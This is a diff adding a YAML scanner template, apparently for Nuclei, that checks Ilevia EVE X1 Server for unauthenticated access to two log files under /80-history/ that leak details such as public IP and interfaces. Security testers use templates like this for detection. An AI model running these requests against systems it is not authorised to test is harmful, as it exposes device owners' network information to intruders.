@@ -1,0 +1,42 @@
+id: IleviaEVEX1Server-eve-server-LeakInfo
+
+info:
+  name: IleviaEVEX1Server-eve-server-LeakInfo
+  author: iSee857
+  severity: high
+  description: |
+    IleviaEVEX1Server-eve-server-LeakInfo
+
+
+http:
+  - raw:
+      - |
+        GET /80-history/eve-server.log HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "Last public ip"
+          - "Interfaces"
+
+  - raw:
+      - |
+        GET /80-history/eve.log HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "Custom Message"
+          - "Function"
